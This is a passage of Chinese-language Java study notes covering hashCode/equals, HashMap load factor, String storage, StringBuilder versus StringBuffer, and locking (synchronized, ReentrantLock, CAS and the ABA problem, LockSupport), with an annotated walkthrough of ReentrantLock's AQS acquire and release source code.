<h4 id="重写HashCode-和equals-方法"><a href="#重写HashCode-和equals-方法" class="headerlink" title="重写HashCode()和equals()方法"></a>重写HashCode()和equals()方法</h4><blockquote>
<p>一定要分布均匀</p>
<ol>
<li><p>如果hashCode()返回的一个值，就会变成单链表</p>
</li>
<li><p>如果hashCode()返回的都不一样值，HashMap就变成数组了</p>
</li>
</ol>
<p>这也称为分布不均匀</p>
<p>equals ，hashCode 需要同时重写，保证一个对象一旦相等，Hash值也应该相同</p>
</blockquote>
<h4 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h4><p>如果可以预测到容量最好，多设置一些，一方面避免频繁的扩容，一方面也需要考虑到加载因子的边界值</p>
<h4 id="为什么Map需要有加载因子，0-75"><a href="#为什么Map需要有加载因子，0-75" class="headerlink" title="为什么Map需要有加载因子，0.75"></a>为什么Map需要有加载因子，0.75</h4><ol>
<li>如果不设置边界值，Map的Hash碰撞概率到后面会越来越高，影响效率</li>
<li>0.75是一个普遍值，需要用数学证明</li>
</ol>
<h2 id="Collection工具类"><a href="#Collection工具类" class="headerlink" title="Collection工具类"></a>Collection工具类</h2><ol>
<li><code>Collections.sort(List list)</code></li>
<li><code>Collections.sort(List list, Compataor cmp)</code></li>
</ol>
<h2 id="String存储原理"><a href="#String存储原理" class="headerlink" title="String存储原理"></a>String存储原理</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
       <span class="token comment">//这里是直接创建在方法区的字符串常量池</span>
       <span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token string">"abc"</span><span class="token punctuation">;</span>
       <span class="token comment">//这个是在堆中创建了一个String对象，但值是指向方法区的</span>
       <span class="token class-name">String</span> s1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token comment">//判断这个字符串在常量池是否存在，如果存在直接返回，如果不存在创建返回</span>
       <span class="token class-name">String</span> s2 <span class="token operator">=</span> s1<span class="token punctuation">.</span><span class="token function">intern</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

       <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s <span class="token operator">==</span> s1<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//false</span>
       <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s1 <span class="token operator">==</span> s2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//false</span>
       <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s <span class="token operator">==</span> s2<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//true</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="String-StringBuilder-StringBuffer"><a href="#String-StringBuilder-StringBuffer" class="headerlink" title="String,StringBuilder,StringBuffer"></a>String,StringBuilder,StringBuffer</h4><ol>
<li>String被final修饰，当你修改时是直接创建一个新的在方法区，所以当我们使用时，如果该值经常就修改，最好使用后面两个</li>
<li>StringBuilder没有final修饰，可变，线程不安全，效率高</li>
<li>StringBuffer没有final修饰，可变，线程安全，效率低</li>
</ol>
<h2 id="锁问题"><a href="#锁问题" class="headerlink" title="锁问题"></a>锁问题</h2><h3 id="Synchronize（重量级锁）"><a href="#Synchronize（重量级锁）" class="headerlink" title="Synchronize（重量级锁）"></a>Synchronize（重量级锁）</h3><blockquote>
<p>加在方法上，对方法进行同步，也就是每次只能一个线程进入。默认为非公平锁</p>
</blockquote>
<ol>
<li>优点：简单，直接，自动完成加锁，解锁操作</li>
<li>缺点：在用户态和内核态进行切换，效率低。</li>
</ol>
<h3 id="ReenLock（手动锁）"><a href="#ReenLock（手动锁）" class="headerlink" title="ReenLock（手动锁）"></a>ReenLock（手动锁）</h3><blockquote>
<p>通过创建锁对象，手动的进行加锁，和解锁</p>
</blockquote>
<ol>
<li>优点：可以自己设置为公平或非公平锁</li>
</ol>
<blockquote>
<p>非公平锁：假如有三个线程同时来，那最终哪个线程能够进入就看谁快，（不用排队）</p>
<p>公平锁：三个线程进入，依次放入一个队列，（先到先得）</p>
</blockquote>
<ol start="2">
<li>缺点：需要自己注意解锁的过程，锁是可重入的，如果少释放一层就会出现死锁现象</li>
</ol>
<h3 id="CAS（Compare-And-Set：轻量级锁，乐观锁）"><a href="#CAS（Compare-And-Set：轻量级锁，乐观锁）" class="headerlink" title="CAS（Compare And Set：轻量级锁，乐观锁）"></a>CAS（Compare And Set：轻量级锁，乐观锁）</h3><blockquote>
<p>通过<code>AtomicReference</code>进行创建自旋锁，每次线程操作前会检查自旋锁的值是否是预想值，如果不是需要进行自旋操作，知道当前值与预期值一致时，才可以操作。</p>
</blockquote>
<ol>
<li>优点：不会进入内核态，减少切换的性能消耗</li>
<li>缺点：自旋其实就是循环，如果一个线程一直无法进行操作，就会导致CPU空转，也会带来性能消耗</li>
</ol>
<blockquote>
<p>CAS的经典问题：ABA问题 -&gt; 就是说我预期值为1，但是别的线程先改成2了，再一个线程又改成1了，那当我判断时并不知道这个值之前已经被人操作了，我会继续执行我自己的逻辑。那么该如何解决呢？</p>
</blockquote>
<p>使用<code>AtomicStampedReference</code>加上时间戳，通俗的说就是加上一个版本号，不仅要比较当前值，还要比较版本号。只有两者都相等，才执行更新操作。</p>
<blockquote>
<p>如果优化CAS?</p>
</blockquote>
<p>可在线程空转一定时间后，放入阻塞队列中等待。</p>
<h3 id="LockSupport"><a href="#LockSupport" class="headerlink" title="LockSupport"></a>LockSupport</h3><ol>
<li>是什么<ol>
<li>对阻塞，唤醒的优化机制</li>
<li>其实底层使用的是一个permit许可证，取值范围0-1</li>
</ol>
</li>
<li>能干嘛<ol>
<li>线程同步操作</li>
</ol>
</li>
<li>去哪下<ol>
<li>JUC包</li>
</ol>
</li>
<li>怎么玩<ol>
<li>LockSupport.port相当于需要消耗一个许可证，如果许可证=1，则直接-1返回，不会阻塞，</li>
<li>LockSupport.unport相当于给出一个许可证，但是许可证上限是1，重复使用unport许可证还是等于1，所以执行两次LockSupport.unport 和 LockSupport.port，会导致最后一个port阻塞</li>
</ol>
</li>
<li>AB法则<ol>
<li>Object.wait() 和 Object.notify() 有哪些不足<ol>
<li>wait 和 notify 必须在同步代码块中出现.</li>
<li>无法先notify，再wait，会导致死锁问题</li>
</ol>
</li>
<li>Lock.Condition.await()  和 signal() 有哪些不足<ol>
<li>与wait,notify的问题一致</li>
</ol>
</li>
<li>所以我们推出了LockSupport，看是如果解决上述方法了。</li>
</ol>
</li>
</ol>
<h3 id="AQS"><a href="#AQS" class="headerlink" title="AQS"></a>AQS</h3><p>我们通过对ReentrantLock的源码解读来学习</p>
<blockquote>
<p>创建锁</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 创建一个Reentrant锁</span>
<span class="token class-name">ReentrantLock</span> lock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReentrantLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 通过构造器我们可以看到实际上创建的是一个Sync对象</span>
<span class="token keyword">public</span> <span class="token class-name">ReentrantLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Sync</span> sync <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NonfairSync</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token comment">// Sync类是继承了AQS（抽象队列同步器）</span>
<span class="token keyword">abstract</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Sync</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractQueuedSynchronizer</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>获取锁</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 底层还是sync对象调用lock方法</span>
lock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">-></span>  sync<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// lock方法是Sync的抽象模板方法，具体由NonfairSync进行实现，这里我们使用默认的非公平锁</span>
<span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  					<span class="token comment">// 尝试获取锁</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">compareAndSetState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token comment">// 如果获取成功则，将当前线程设为所有者线程</span>
                <span class="token function">setExclusiveOwnerThread</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>
                <span class="token comment">// 如果没获取到，则再判断</span>
                <span class="token function">acquire</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">acquire</span><span class="token punctuation">(</span><span class="token keyword">int</span> arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  			<span class="token comment">// 调用nonfairTryAcquire(int acquires) 再次尝试获取锁，判断是否为可重入</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">tryAcquire</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
            <span class="token comment">// 先将当前线程创建成一个节点，加入等待队列中，再进行最后的尝试</span>
            <span class="token function">acquireQueued</span><span class="token punctuation">(</span><span class="token function">addWaiter</span><span class="token punctuation">(</span><span class="token class-name">Node</span><span class="token punctuation">.</span><span class="token constant">EXCLUSIVE</span><span class="token punctuation">)</span><span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token function">selfInterrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">nonfairTryAcquire</span><span class="token punctuation">(</span><span class="token keyword">int</span> acquires<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 当前线程</span>
    <span class="token keyword">final</span> <span class="token class-name">Thread</span> current <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 这里使用AQS方法，获取锁值，</span>
  	<span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 如果为0说明可以抢占锁了</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">compareAndSetState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> acquires<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">setExclusiveOwnerThread</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 判断之前抢到锁的线程是否就是自己，保证锁的可重入性</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>current <span class="token operator">==</span> <span class="token function">getExclusiveOwnerThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 如果是，则计数器+1</span>
        <span class="token keyword">int</span> nextc <span class="token operator">=</span> c <span class="token operator">+</span> acquires<span class="token punctuation">;</span>
        <span class="token comment">// 这里怕计数器溢出了</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>nextc <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">// overflow</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Maximum lock count exceeded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setState</span><span class="token punctuation">(</span>nextc<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 判断抢锁成功</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
   <span class="token comment">// 抢锁失败</span>
    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token class-name">Node</span> <span class="token function">addWaiter</span><span class="token punctuation">(</span><span class="token class-name">Node</span> mode<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token comment">// 添加一个等待节点，并标记为渎职EXCLUSIVE独占模式</span>
    <span class="token class-name">Node</span> node <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> mode<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// Try the fast path of enq; backup to full enq on failure</span>
    <span class="token comment">// 获取队列中的尾结点</span>
    <span class="token class-name">Node</span> pred <span class="token operator">=</span> tail<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>pred <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 尾结点不为空，说明前面还有等待的节点，则进行串联</span>
        node<span class="token punctuation">.</span>prev <span class="token operator">=</span> pred<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">compareAndSetTail</span><span class="token punctuation">(</span>pred<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            pred<span class="token punctuation">.</span>next <span class="token operator">=</span> node<span class="token punctuation">;</span>
            <span class="token keyword">return</span> node<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 如果队列为空，则插入当前节点到队列中</span>
    <span class="token function">enq</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 最后返回生成的节点</span>
    <span class="token keyword">return</span> node<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">private</span> <span class="token class-name">Node</span> <span class="token function">enq</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Node</span> node<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 这是一个自旋结构</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 再次判断队列是否为空</span>
            <span class="token class-name">Node</span> t <span class="token operator">=</span> tail<span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// Must initialize</span>
                <span class="token comment">// 将该节点加入队列，这里注意头结点和尾结点是一个系统自建的一个节点，也是一个面试可能考的点，第一个进入等待队列的节点，其头指针指向的是哨兵节点</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">compareAndSetHead</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                    tail <span class="token operator">=</span> head<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token comment">// 新来的节点连接尾结点或哨兵节点</span>
                node<span class="token punctuation">.</span>prev <span class="token operator">=</span> t<span class="token punctuation">;</span>
                <span class="token comment">// 将尾指针设置为新加入的节点</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">compareAndSetTail</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    t<span class="token punctuation">.</span>next <span class="token operator">=</span> node<span class="token punctuation">;</span>
                    <span class="token keyword">return</span> t<span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>开始准备将节点进行阻塞</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">acquireQueued</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Node</span> node<span class="token punctuation">,</span> <span class="token keyword">int</span> arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">boolean</span> failed <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">boolean</span> interrupted <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
       <span class="token comment">// 自旋结构</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
           <span class="token comment">// 获取当前封装节点的前一个节点</span>
            <span class="token keyword">final</span> <span class="token class-name">Node</span> p <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">predecessor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 如果p就是头结点，也就是哨兵节点，则再尝试去获取锁</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> head <span class="token operator">&amp;&amp;</span> <span class="token function">tryAcquire</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token comment">// 如果获取成功了，将当前线程节点设置为头结点</span>
                <span class="token function">setHead</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">// 将之前的头结点进行垃圾回收，这里其实就是头结点的替换</span>
                p<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token comment">// help GC</span>
                failed <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
                <span class="token comment">// 返回线程是否被打断过</span>
                <span class="token keyword">return</span> interrupted<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token comment">// Park相当于wait进行阻塞</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">shouldParkAfterFailedAcquire</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> node<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
                <span class="token function">parkAndCheckInterrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                interrupted <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>failed<span class="token punctuation">)</span>
            <span class="token comment">// 取消排队</span>
            <span class="token function">cancelAcquire</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">shouldParkAfterFailedAcquire</span><span class="token punctuation">(</span><span class="token class-name">Node</span> pred<span class="token punctuation">,</span> <span class="token class-name">Node</span> node<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token comment">// 获取前一个节点可能是哨兵节点的状态值</span>
        <span class="token keyword">int</span> ws <span class="token operator">=</span> pred<span class="token punctuation">.</span>waitStatus<span class="token punctuation">;</span>
        <span class="token comment">// 如果status值=-1</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>ws <span class="token operator">==</span> <span class="token class-name">Node</span><span class="token punctuation">.</span><span class="token constant">SIGNAL</span><span class="token punctuation">)</span>
            <span class="token comment">// 说明这个节点已经尝试过一次（因为调用结构为自旋），但是失败了</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>ws <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">/*
             * Predecessor was cancelled. Skip over predecessors and
             * indicate retry.
             */</span>
            <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>
                node<span class="token punctuation">.</span>prev <span class="token operator">=</span> pred <span class="token operator">=</span> pred<span class="token punctuation">.</span>prev<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>pred<span class="token punctuation">.</span>waitStatus <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            pred<span class="token punctuation">.</span>next <span class="token operator">=</span> node<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 这里如果是第一次来，则将前节点状态值设置为-1</span>
            <span class="token function">compareAndSetWaitStatus</span><span class="token punctuation">(</span>pred<span class="token punctuation">,</span> ws<span class="token punctuation">,</span> <span class="token class-name">Node</span><span class="token punctuation">.</span><span class="token constant">SIGNAL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">parkAndCheckInterrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 当前节点直接被挂起，相当于阻塞，也就是不再去抢锁了</span>
        <span class="token class-name">LockSupport</span><span class="token punctuation">.</span><span class="token function">park</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">interrupted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>解锁</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">-></span>   sync<span class="token punctuation">.</span><span class="token function">release</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">release</span><span class="token punctuation">(</span><span class="token keyword">int</span> arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 尝试解锁</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">tryRelease</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 当前节点解锁成功后，再看AQS头结点</span>
            <span class="token class-name">Node</span> h <span class="token operator">=</span> head<span class="token punctuation">;</span>
            <span class="token comment">// 如果头结点不为空，且只要status!=0,说明队列中肯定有阻塞的节点</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>h <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> h<span class="token punctuation">.</span>waitStatus <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
                <span class="token function">unparkSuccessor</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">tryRelease</span><span class="token punctuation">(</span><span class="token keyword">int</span> releases<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 将当前线程节点状态-1，</span>
            <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> releases<span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">getExclusiveOwnerThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalMonitorStateException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">boolean</span> free <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token comment">// c=0表示已经锁解除干净了，没有重入了</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                free <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
                <span class="token comment">// 将占锁标记指向null，其他线程看到了。就可以直接去抢占了</span>
                <span class="token function">setExclusiveOwnerThread</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token comment">// 设置这个线程的状态值</span>
            <span class="token function">setState</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 返回解锁成功</span>
            <span class="token keyword">return</span> free<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

